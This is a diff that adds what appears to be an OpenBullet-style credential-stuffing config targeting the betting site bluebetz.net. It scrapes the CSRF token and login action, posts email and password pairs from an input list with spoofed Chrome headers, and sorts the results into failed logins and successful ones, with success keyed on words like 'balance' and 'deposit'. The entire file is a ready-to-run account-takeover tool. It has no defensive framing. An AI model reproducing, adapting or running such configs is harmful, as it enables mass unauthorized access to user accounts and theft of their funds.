@@ -1,0 +1,67 @@
+BLOCK:HttpRequest
+LABEL:GetHomePage
+  url = "https://bluebetz.net/home"
+  customHeaders = {("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"), ("accept-language", "en-US,en;q=0.9"), ("accept-encoding", "gzip, deflate, br"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"), ("upgrade-insecure-requests", "1")}
+  TYPE:STANDARD
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractCSRFToken
+  input = @data.SOURCE
+  leftDelim = "name=\"_token\" value=\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @CSRFToken
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractLoginURL
+  input = @data.SOURCE
+  leftDelim = "action=\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @LoginURL
+ENDBLOCK
+
+BLOCK:Function
+LABEL:BuildLoginURL
+  function = "if(@LoginURL.StartsWith(\"/\")) { return \"https://bluebetz.net\" + @LoginURL; } else if(@LoginURL.StartsWith(\"http\")) { return @LoginURL; } else { return \"https://bluebetz.net/login\"; }"
+  => VAR @FinalLoginURL
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:Login
+  url = @FinalLoginURL
+  method = POST
+  customHeaders = {("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"), ("accept-language", "en-US,en;q=0.9"), ("accept-encoding", "gzip, deflate, br"), ("content-type", "application/x-www-form-urlencoded"), ("origin", "https://bluebetz.net"), ("referer", "https://bluebetz.net/home"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"), ("upgrade-insecure-requests", "1")}
+  TYPE:STANDARD
+  "_token=@CSRFToken&email=@input.USER&password=@input.PASS"
+  "application/x-www-form-urlencoded"
+ENDBLOCK
+
+BLOCK:Keycheck
+  KEYCHAIN FAIL OR
+    STRINGKEY @data.SOURCE Contains "Invalid credentials"
+    STRINGKEY @data.SOURCE Contains "These credentials do not match"
+    STRINGKEY @data.SOURCE Contains "login failed"
+    STRINGKEY @data.SOURCE Contains "authentication failed"
+    STRINGKEY @data.SOURCE Contains "incorrect password"
+    STRINGKEY @data.SOURCE Contains "incorrect email"
+    STRINGKEY @data.SOURCE Contains "error"
+    STRINGKEY @data.SOURCE Contains "Error"
+    STRINGKEY @data.RESPONSECODE Contains "401"
+    STRINGKEY @data.RESPONSECODE Contains "403"
+    STRINGKEY @data.RESPONSECODE Contains "400"
+    STRINGKEY @data.RESPONSECODE Contains "422"
+  KEYCHAIN SUCCESS OR
+    STRINGKEY @data.SOURCE Contains "dashboard"
+    STRINGKEY @data.SOURCE Contains "logout"
+    STRINGKEY @data.SOURCE Contains "Logout"
+    STRINGKEY @data.SOURCE Contains "account"
+    STRINGKEY @data.SOURCE Contains "balance"
+    STRINGKEY @data.SOURCE Contains "deposit"
+    STRINGKEY @data.HEADERS["Location"] Contains "/dashboard"
+    STRINGKEY @data.HEADERS["Location"] Contains "/home"
+    STRINGKEY @data.RESPONSECODE Contains "200"
+    STRINGKEY @data.RESPONSECODE Contains "302"
+ENDBLOCK
